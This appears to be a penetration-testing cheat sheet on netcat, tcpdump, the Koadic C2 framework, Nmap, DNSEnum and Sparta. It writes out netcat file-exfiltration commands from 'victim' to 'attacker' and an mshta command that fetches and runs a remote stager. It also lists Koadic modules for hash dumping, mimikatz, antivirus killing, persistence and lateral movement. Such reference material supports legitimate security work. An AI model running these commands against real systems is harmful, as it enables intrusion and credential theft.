Netcat is a simple tool used to communicate over a given port between a client and a server on a network. The command can be used to send messages or files over tcp or udp. There must be a server listening and a client sending for successful communication. It can be used in conjunction with other utilities to provide a pipeline over which an exploit can be used or deeper discovery can be achieved.

## Start Listener on the Target

``nc -l -p [port]``

## Start Client on Kali

``nc [target_ip_address] [port]``

Now you can send text to the target console session

## Push file from attacker to victim

On Victim:

``nc -lvp [port] > [destination path]``

On Attacker:

``nc [victimip] [victimport] < [path and name of file]``

## Pull file from victim

On Victim:

``nc -l -p [port] < [path and filename]``

On Attacker:

``nc [victimip] [victimport] > [path and name of file]``

## Port Scanning

``nc -z -v [targetip] [port or port range]``

## Banner Grab

``nc [ipaddress] [port]``

TCP Dump is a packet capture utility. It watches traffic on the given interface and streams packet capture to a pcap file. This pcap file can be analyzed in Wireshark. When used in conjunction with netcat, tcpdump can provide pcap files of a victim to a remote attacker.

``tcpdump -i eth0 -w [filename.pcap]``

[Koadic Github](https://github.com/zerosum0x0/koadic)

Koadic is a post-exploitation tool used to harvest information, deliver malicious payloads, and pivot/propagate exploitation. It is a command and control utility that listens as a web server on a specified port for targets to register. Targets are called zombies, and the web server is called a stager. The red team member uses koadics implant modules to create jobs for zombies. The zombies collect and execute these jobs, returning data or confirming successful configuration changes.

## Install

Koadic is not included with Kali. You must install pre-requisites and clone the repository to get koadic.

1.	In Kali, open a terminal.
2.	Update the apt repository list

        sudo apt -y update

3.	Install Python 3.7 and PIP 3:

        sudo apt -y install python3.7 python3-pip
 
4.	Clone the repository using git:

        git clone [Koadic Github](https://github.com/zerosum0x0/koadic)
 
5.	Install koadic requirements from the requirements list:

        cd koadic
        sudo pip3 install -r requirements.txt
 
6.	Start Koadic:

        ./koadic
 
## Configure Stager and Register Zombie Windows 10 Machine

1.	Show and Set stager parameters:

        info
        set SRVPORT <desired port number>
        set ENDPOINT test (or desired endpoint name)
 
2.	Run the stager:

        run
 
Make note of the second returned line. This is what the target must run to register as a zombie of this stager.

3.	On a Windows 10 machine, open an admin powershell console window

4.	Run the mshta command with our new stager url (the one returned when we started the stager)

        mshta http://<ipaddress>:<port>/<endpointname>
 
5.	On Kali, show zombies list:

        zombies
 
## Use Implant Modules

Implants are python-based modules used to create jobs on the stager for zombies to run. You can create custom implants and add to your modules directory for extensibility.

To use an implant:

    use <implant path>

Set parameters if necessary:

    info
    set <parameter name> <parameter value>

Run the implant:

    run

## Notable Gather Modules

* Implant/gather/clipboard – collects current clipboard value for logged in user
* Implant/gather/enum_domain_info – collect verbose domain information
* Implant/gather/hashdump_sam – pulls account names with password hashes
* Implant/gather/loot_finder – looks for interesting/notable files

## Notable Inject Modules

* Implant/inject/mimikatz_dotnet2js – Runs mimikatz on the zombie to pull password hashes
    
        creds -a – shows a verbose output of returned mimikatz information

## Notable Manage Modules

* Implant/manage/exec_cmd – Runs given command on the zombie as a local command
* Implant/manage/killav – Kills some antivirus clients

## Notable Persist Modules

* Implant/persist/add_user – Adds a user with given username, password. Can also add the user as local administrator
* Implant/persist/schtasks – Create scheduled task on zombie. Can be used to run the mshta command every time the target starts
* Implant/persist/registry – Create/modify registry entries on zombie

## Other Notable Modules

* Implant/phish/password_box – Shows a dialog box prompting the user to enter a value. Default requests they enter a password
* Implant/pivot/exec_psexec – Runs remote command from the zombie against another device. Can be used to remote register other targets as zombies
* Implant/scan/tcp – Runs nmap-like scan to enumerate listening ports on a given target
* Implant/util/download_file – Downloads file from zombie to given local directory
* Implant/util/upload_file – Uploads file to zombie

This tool uses Jscript and VBScript to run these modules, so powershell is not a requirement for Koadic like other C2 tools. You can create your own python scripts to run as implants if there is something this tool is lacking. Koadic is a powerful post-exploitation utility and makes an excellent addition to any pen testing framework.

## Network exploration tool and security / port scanner

[NMap Cheatsheet](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/)

[Nmap Documentation](https://nmap.org/docs.html)

[NMap Legal Issues](https://nmap.org/book/legal-issues.html)

Nmap (“Network Mapper”) is an open source tool for network exploration and security auditing. It was designed to rapidly scan large networks, although it works fine against single hosts. Nmap uses
raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions)
they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. While Nmap is commonly used for security audits, many systems and network administrators
find it useful for routine tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with supplemental information on each depending on the options used. Key among that information is the "interesting ports table".  That table lists the port number and protocol, service name, and state. The state is either open, filtered, closed, or unfiltered.  Open means that an application on the target machine is listening for connections/packets on that port.  Filtered means that a firewall, filter, or other network obstacle is blocking the port so that Nmap cannot tell whether it is open or closed.  Closed ports have no application listening on them, though they could open up at any time. Ports are classified as unfiltered when they are responsive to Nmap's probes, but Nmap cannot determine whether they are open or closed. Nmap reports the state combinations open|filtered and closed|filtered when it cannot determine which of the two states describe a port. The port table may also include software version details when version detection has been requested. When an IP protocol scan is requested (-sO), Nmap provides information on supported IP protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide further information on targets, including reverse DNS names, operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in Example 1. The only Nmap arguments used in this example are -A, to enable OS and version detection, script scanning, and traceroute; -T4 for faster execution; and
then the hostname.

## DNSEnum

Enumerates DNS information of a domain and to discover non-contiguous ip blocks.

### OPERATIONS:

* Get the host’s addresse (A record).
* Get the namservers (threaded).
* Get the MX record (threaded).
* Perform axfr queries on nameservers and get BIND VERSION (threaded).
* Get extra names and subdomains via google scraping (google query = “allinurl: -www site:domain”).
* Brute force subdomains from file, can also perform recursion on subdomain that have NS records (all threaded).
* Calculate C class domain network ranges and perform whois queries on them (threaded).
* Perform reverse lookups on netranges ( C class or/and whois netranges) (threaded).
* Write to domain_ips.txt file ip-blocks.

[Sparta Documentation](https://tools.kali.org/information-gathering/sparta)

Sparta is a utility that automates active discovery. It starts by running nmap scans of a given ip range. Sparta will then run other various tools based on the services discovered. 

Sparta can be found in the menu under vulnerability analysis

![sparta 1](media/sparta_1.png)

When sparta opens, click in the left pane to add hosts
 
![sparta 1](media/sparta_1.png)

Enter a network range in CIDR notation or a single ip

Sparta will begin running an nmap discovery of the scope.

![sparta 1](media/sparta_1.png)

Results for each tool by host can be found by choosing the different tabs at the top of the right pane

![sparta 1](media/sparta_1.png)
 
Tools like nikto are ran automatically when a host is found to have a web server running on it.

Sparta is a great tool to use in place of manual nmap scans since you can start a scan job and come back to a set of comprehensive active discovery results without having to individually run each utility based on your initial manual nmap scan.
